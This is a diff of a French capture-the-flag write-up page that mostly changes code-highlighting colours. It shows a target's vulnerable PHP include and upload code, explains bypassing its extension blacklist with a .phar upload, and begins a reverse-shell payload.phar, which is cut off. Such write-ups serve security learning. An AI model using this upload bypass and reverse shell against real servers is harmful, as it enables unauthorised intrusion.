@@ -28,6 +28,10 @@
 
 
 
+    
+        <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    
+
 
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -214,59 +218,59 @@
 <h1 id="foothold">Foothold</h1>
 <p>Mais c’est surtout un sous domaine dont on a le code source dans le .git, donc on va aller y jeter un oeil</p>
 <p>L’index include juste checker ou le fichier en fonction du lien avec un filtre pour les LFI, on va regarder dans <code>checker</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">b</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">This</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">only</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">developers</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">b</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?page=admin&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Admin</span> <span style="color:#a6e22e">Panel</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;DIRECTACCESS&#34;</span>,<span style="color:#66d9ef">false</span>);
-</span></span><span style="display:flex;"><span>	$page<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;page&#39;</span>];
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($page <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/bin|usr|home|var|etc/i&#34;</span>,$page)){
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.php&#34;</span>);
-</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;checker.php&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>b<span style="color:#ff79c6">&gt;</span><span style="color:#ff79c6">This</span> is only <span style="color:#ff79c6">for</span> developers<span style="color:#ff79c6">&lt;/</span>b<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>a href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;?page=admin&#34;</span><span style="color:#ff79c6">&gt;</span>Admin Panel<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span>	define(<span style="color:#f1fa8c">&#34;DIRECTACCESS&#34;</span>,<span style="color:#ff79c6">false</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">$page</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;page&#39;</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$page</span> <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>preg_match(<span style="color:#f1fa8c">&#34;/bin|usr|home|var|etc/i&#34;</span>,<span style="color:#8be9fd;font-style:italic">$page</span>)){
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">include</span>(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;page&#39;</span>] <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;.php&#34;</span>);
+</span></span><span style="display:flex;"><span>	}<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">include</span>(<span style="color:#f1fa8c">&#34;checker.php&#34;</span>);
 </span></span><span style="display:flex;"><span>	}	
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>C’est le fichier qui gère l’upload et le check de la liste d’urls, c’est là qu’on verra les eventuels filtres et ce qu’il se passe quand on lui upload un fichier</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># File size must be less than 10kb.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10000</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;File too large!&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>C’est le fichier qui gère l’upload et le check de la liste d’urls, c’est là qu’on verra les eventuels filtres et ce qu’il se passe quand on lui upload un fichier</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#6272a4"># File size must be less than 10kb.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#39;file&#39;</span>][<span style="color:#f1fa8c">&#39;size&#39;</span>] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">10000</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;File too large!&#34;</span>);
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>        $file <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$file</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#39;file&#39;</span>][<span style="color:#f1fa8c">&#39;name&#39;</span>];
 </span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check if extension is allowed.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">getExtension</span>($file);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&#34;</span>,$ext)){
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Extension not allowed!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Check if extension is allowed.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">$ext</span> <span style="color:#ff79c6">=</span> getExtension(<span style="color:#8be9fd;font-style:italic">$file</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(preg_match(<span style="color:#f1fa8c">&#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&#34;</span>,<span style="color:#8be9fd;font-style:italic">$ext</span>)){
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;Extension not allowed!&#34;</span>);
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>  
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Create directory to upload our file.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">time</span>())<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/&#34;</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($dir)){
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mkdir</span>($dir, <span style="color:#ae81ff">0770</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Create directory to upload our file.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">$dir</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;uploads/&#34;</span><span style="color:#ff79c6">.</span>md5(time())<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#34;/&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>is_dir(<span style="color:#8be9fd;font-style:italic">$dir</span>)){
+</span></span><span style="display:flex;"><span>        mkdir(<span style="color:#8be9fd;font-style:italic">$dir</span>, <span style="color:#bd93f9">0770</span>, <span style="color:#ff79c6">true</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>  
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Upload the file.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $final_path <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span>$file;
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>], <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>$final_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4"># Upload the file.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">$final_path</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$dir</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$file</span>;
+</span></span><span style="display:flex;"><span>        move_uploaded_file(<span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#39;file&#39;</span>][<span style="color:#f1fa8c">&#39;tmp_name&#39;</span>], <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$final_path</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>);
 </span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Read the uploaded file.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $websites <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#a6e22e">file_get_contents</span>($final_path));
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4"># Read the uploaded file.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">$websites</span> <span style="color:#ff79c6">=</span> explode(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,file_get_contents(<span style="color:#8be9fd;font-style:italic">$final_path</span>));
 </span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span>($websites <span style="color:#66d9ef">as</span> $site){
-</span></span><span style="display:flex;"><span>                $site<span style="color:#f92672">=</span><span style="color:#a6e22e">trim</span>($site);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#file://#i&#34;</span>,$site) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#data://#i&#34;</span>,$site) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#ftp://#i&#34;</span>,$site)){
-</span></span><span style="display:flex;"><span>                        $check<span style="color:#f92672">=</span><span style="color:#a6e22e">isitup</span>($site);
-</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span>($check){
-</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;center&gt;</span><span style="color:#e6db74">{</span>$site<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;br&gt;&lt;font color=&#39;green&#39;&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;&#34;</span>;
-</span></span><span style="display:flex;"><span>                        }<span style="color:#66d9ef">else</span>{
-</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;center&gt;</span><span style="color:#e6db74">{</span>$site<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;br&gt;&lt;font color=&#39;red&#39;&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">foreach</span>(<span style="color:#8be9fd;font-style:italic">$websites</span> <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">$site</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">$site</span><span style="color:#ff79c6">=</span>trim(<span style="color:#8be9fd;font-style:italic">$site</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>preg_match(<span style="color:#f1fa8c">&#34;#file://#i&#34;</span>,<span style="color:#8be9fd;font-style:italic">$site</span>) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>preg_match(<span style="color:#f1fa8c">&#34;#data://#i&#34;</span>,<span style="color:#8be9fd;font-style:italic">$site</span>) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>preg_match(<span style="color:#f1fa8c">&#34;#ftp://#i&#34;</span>,<span style="color:#8be9fd;font-style:italic">$site</span>)){
+</span></span><span style="display:flex;"><span>                        <span style="color:#8be9fd;font-style:italic">$check</span><span style="color:#ff79c6">=</span>isitup(<span style="color:#8be9fd;font-style:italic">$site</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$check</span>){
+</span></span><span style="display:flex;"><span>                                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;center&gt;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$site</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;br&gt;&lt;font color=&#39;green&#39;&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        }<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>                                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;center&gt;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$site</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;br&gt;&lt;font color=&#39;red&#39;&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;&#34;</span>;
 </span></span><span style="display:flex;"><span>                        }       
-</span></span><span style="display:flex;"><span>                }<span style="color:#66d9ef">else</span>{
-</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;center&gt;&lt;font color=&#39;red&#39;&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>                }<span style="color:#ff79c6">else</span>{
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;center&gt;&lt;font color=&#39;red&#39;&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;&#34;</span>;
 </span></span><span style="display:flex;"><span>                }
 </span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Delete the uploaded file.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>($final_path);
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Delete the uploaded file.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">@</span>unlink(<span style="color:#8be9fd;font-style:italic">$final_path</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>On sait donc que:</p>
 <ul>
@@ -279,73 +283,73 @@
 <p>Ensuite, le danger des blacklists, c’est oublier une extention, en l’occurence ici, l’extention <strong><strong><strong><strong><strong>.phar</strong></strong></strong></strong></strong> n’est pas blacklist, on va donc pouvoir upload des fichiers php qui seront lus</p>
 <p>Enfin, pour éviter que le fichier soit supprimé directement, on va lui donner une grande quantité d’urls à check, pour que ça prenne plus de temps</p>
 <p>On crée donc notre <strong><strong><strong><strong><strong><strong><strong><strong>payload.phar</strong></strong></strong></strong></strong></strong></strong></strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ebay</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fr</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">t</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tmall</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">.</span><span style="color:#a6e22e">br</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#ae81ff">360.</span><span style="color:#a6e22e">cn</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sohu</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">amazon</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">jp</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">pinterest</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">netflix</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">it</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ru</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">microsoft</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">es</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">wordpress</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">gmw</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tumblr</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">paypal</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">blogspot</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">imgur</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">stackoverflow</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">aliexpress</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">naver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ok</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ru</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">apple</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">github</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">chinadaily</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">imdb</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">kr</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fc2</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">jd</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">blogger</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#ae81ff">163.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ca</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">whatsapp</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">amazon</span><span style="color:#f92672">.</span><span style="color:#a6e22e">in</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">office</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tianya</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">id</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//Upload reverse-shell, bypass exec(), shell_exec(), system(), fsockopen(), passthru()
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>$descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
-</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>),  
